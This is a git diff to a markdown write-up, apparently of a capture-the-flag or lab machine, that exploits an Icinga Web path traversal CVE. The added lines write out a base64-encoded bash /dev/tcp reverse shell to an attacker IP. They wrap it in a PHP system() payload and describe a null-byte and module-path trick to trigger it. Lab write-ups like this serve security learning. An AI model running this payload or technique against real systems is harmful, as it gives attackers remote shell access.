@@ -68,6 +68,41 @@ then i'll upload everything using my own key:
 
 <figure><img src="../../../.gitbook/assets/image (961).png" alt=""><figcaption></figcaption></figure>
 
-\----------I just modified the user since the article talked about saving the resource outside the intended directory and was able to access my key using this technique:
+I just modified the user since the article talked about saving the resource outside the intended directory and was able to access my key using this technique:
 
 <figure><img src="../../../.gitbook/assets/image (963).png" alt=""><figcaption></figcaption></figure>
+
+Since \<e have access to the files, maybe we can trigger a PHP revers shell:
+
+```
+echo -n '/bin/bash -i >& /dev/tcp/10.10.14.141:3636 0>&1' | base64 -w 0
+```
+
+<figure><img src="../../../.gitbook/assets/image (976).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../../.gitbook/assets/image (979).png" alt=""><figcaption></figcaption></figure>
+
+```
+<?php system("echo -n L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjE0MTozNjM2IDA+JjE | base64 -d | bash")?>
+```
+
+We can see how the CVE is trhiggered:
+
+[https://www.sonarsource.com/blog/path-traversal-vulnerabilities-in-icinga-web/](https://www.sonarsource.com/blog/path-traversal-vulnerabilities-in-icinga-web/)
+
+<figure><img src="../../../.gitbook/assets/image (980).png" alt=""><figcaption></figcaption></figure>
+
+So for the payload to be triggered, we need to put a null byte in between the cert and the payload
+
+So we put a null byte in between and forward the request:
+
+<figure><img src="../../../.gitbook/assets/image (981).png" alt=""><figcaption></figcaption></figure>
+
+And we can see here how we trigger the code, we have to change the default path of the modules to the place we put our payload:
+
+<figure><img src="../../../.gitbook/assets/image (982).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../../.gitbook/assets/image (983).png" alt=""><figcaption></figcaption></figure>
+
+We change this to /dev/shm
+
